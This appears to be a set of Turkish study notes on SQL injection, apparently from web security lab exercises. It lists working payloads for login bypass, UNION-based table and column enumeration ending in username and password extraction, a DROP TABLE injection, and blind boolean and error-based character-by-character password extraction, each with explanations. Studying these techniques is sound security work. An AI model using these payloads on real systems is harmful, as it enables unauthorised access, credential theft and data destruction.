# SQL İnjection

# Basic SQL Injection

### Tanım
- SELECT * FROM products WHERE category = 'Gifts' AND released = 1
    - SELECT: Hangi sütunları seçeceğimizi belirtir. * kullanılırsa, tüm sütunlar seçilir.
    - FROM: Hangi tablodan veri çekileceğini belirtir.
    - WHERE: Belirtilen koşullara uyan satırları filtreler.
    - products tablosundan (FROM products), category sütunu 'Gifts' olan (WHERE category = 'Gifts'), ve released sütunu 1 olan (AND released = 1), tüm sütunları (*) seçer.

-------------------------------------

### ' OR+1=1--
- ==> SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
    - OR 1=1 → Her zaman TRUE olur, yani bütün ürünleri seçer.
    - -- → SQL’de yorum satırı başlatır, yani AND released = 1 kısmını iptal eder.
    - Normalde yalnızca 'Gifts' kategorisindeki ve yayınlanmış ürünler döndürülmeliydi.
    - Ancak saldırgan OR 1=1 ekleyerek bütün ürünleri seçtirdi.
    - -- operatörü sayesinde sorgunun devamını etkisiz hale getirerek kontrolü ele aldı.

- ' OR 1=1; DROP TABLE products; -- ==> SELECT * FROM products WHERE category = '' OR 1=1; DROP TABLE products; --';
    - OR 1=1 → Tüm kayıtları döndürür.
    - ; → SQL'de birden fazla komutu aynı anda çalıştırmak için kullanılır.
    - DROP TABLE products → products tablosunu tamamen siler!  (Eğer Yetkisi varsa)
    - -- → Yorum satırı başlatarak kalan her şeyi etkisiz hale getirir.

-------------------------------------

### administrator'--
- ==> SELECT * FROM users WHERE username = 'administrator'--' AND password = 'sifre';
    - -- SQL'de yorum satırı başlatır, yani AND password = 'sifre' kısmı çalışmaz.
    - Eğer "administrator" kullanıcısının şifresi kontrol edilmeden giriş yapılıyorsa, Zafiyettir.

-------------------------------------

# Union-Based SQL Injection (Birlik Tabanlı SQL Enjeksiyonu)

### Tanım
- SELECT * FROM products WHERE category = 'Gifts' ...

- ==> +UNION+SELECT+NULL,NULL,NULL-- ==> ' order by 3-- --> ok

-------------------------------------

### UNION (Oracle)
- ' ORDER BY 1--
- ' UNION SELECT 'abc', 'def' FROM dual-- ==> ' order by 2-- --> ok
- ' UNION SELECT BANNER, NULL FROM v$version-- ==> versiyon öğrenme
- '+UNION+SELECT+table_name,NULL+FROM+all_tables-- 
    - ==> USERS_ABCDEF
- '+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'-- 
    - ==> USERNAME_ABCDEF PASSWORD_ABCDEF
- '+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--

### UNION (MySQL, MSSQL (Microsoft SQL Server), PostgreSQL, SQLite)
- ' ORDER BY 1--
- ==> ' UNION SELECT 'abc', 'def'#
- ==> ' UNION SELECT @@version, NULL#
- ==> '+UNION+SELECT+'abc','def'--
- ==> '+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
- ==> '+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
- ==> '+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--

-------------------------------------

- ==> ' UNION SELECT table_name, NULL FROM all_tables--
- ==> '+UNION+SELECT+NULL,NULL,NULL--
- ==> '+UNION+SELECT+'abc','def'--
- ==> ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS'--
- ==> ' UNION SELECT username, password FROM users--
- ==> ' UNION SELECT NULL, username || '~' || password FROM users--

-------------------------------------

# Blind SQL injection (Kör SQL enjeksiyonu)

### Tanım
- SELECT * FROM sessions WHERE TrackingId = 'xyz123';
- SELECT * FROM users WHERE TrackingId = 'xyz' AND '1'='1'
- TrackingId=JNwDzr5zsVqhNLyC' AND '1'='1
- SELECT * FROM users WHERE TrackingId = 'xyz' AND '1'='2'
- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a 
- TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a ==> welcome back
-  TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
- TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
- 

-------------------------------------

- ==> SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
    - SELECT TrackingId → TrackingId sütunundaki değeri alır.
    - FROM TrackedUsers → TrackedUsers tablosundan veri çeker.
    - WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4' → Sadece belirli bir TrackingId değerine sahip satırları döndürür.

-------------------------------------

SELECT * FROM Users WHERE TrackingId = 'xyz' 
AND SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1) > 'm'

    -     SUBSTRING((SELECT Password FROM Users WHERE Username = 'Administrator'), 1, 1)
        - "Administrator" kullanıcısının şifresinin ilk karakterini alır.
    - > 'm'
        - Şifrenin ilk harfinin 'm'den büyük olup olmadığını kontrol eder.
        - Eğer doğruysa, sorgu başarılı olur ve veri döner.
        - Eğer yanlışsa, sorgu başarısız olur ve veri dönmez.

-------------------------------------

SELECT * FROM Users WHERE TrackingId = 'xyz' 
AND (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'

Açıklama:

    CASE WHEN (1=2) THEN 1/0 ELSE 'a' END
        (1=2) → FALSE döner
        FALSE olursa 'a' döner.
        TRUE olsaydı 1/0 çalışarak sıfıra bölme hatası oluşturacaktı.

    (SELECT CASE WHEN (1=2) THEN 1/0 ELSE 'a' END)='a'
        Burada CASE ifadesi 'a' döndürdüğü için sorgu başarıyla çalışır ve veri dönebilir.
        Eğer (1=2) yerine (1=1) yazılsaydı, 1/0 işlemi hata oluştururdu.

Bu teknikle saldırgan şunları test edebilir:

    SQL Injection var mı?
        Hata mesajı alırsa, SQL Injection zafiyeti var demektir.
    Hata tabanlı saldırılar mümkün mü?
        Eğer hata mesajı alınabiliyorsa (1/0 sıfıra bölme hatası gibi), saldırgan hata tabanlı SQL Injection kullanabilir.

-------------------------------------

SELECT * FROM Users WHERE TrackingId = 'xyz' 
AND (SELECT CASE 
        WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') 
        THEN 1/0 
        ELSE 'a' 
      END FROM Users)='a'

-------------------------------------